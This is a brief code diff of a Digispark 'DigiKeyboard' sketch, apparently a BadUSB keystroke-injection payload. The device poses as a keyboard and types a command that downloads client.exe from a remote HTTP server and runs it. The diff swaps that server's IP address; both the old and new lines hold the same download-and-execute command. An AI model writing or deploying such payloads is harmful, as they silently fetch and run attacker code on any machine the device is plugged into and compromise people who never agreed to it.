@@ -12,7 +12,7 @@ void setup() {
   DigiKeyboard.delay(DELAY);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(DELAY);
-  DigiKeyboard.print("curl -o client.exe http://10.10.15.177:8000/; .\\client.exe");
+  DigiKeyboard.print("curl -o client.exe http://192.168.29.100:8000/; .\\client.exe");
   DigiKeyboard.delay(DELAY);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
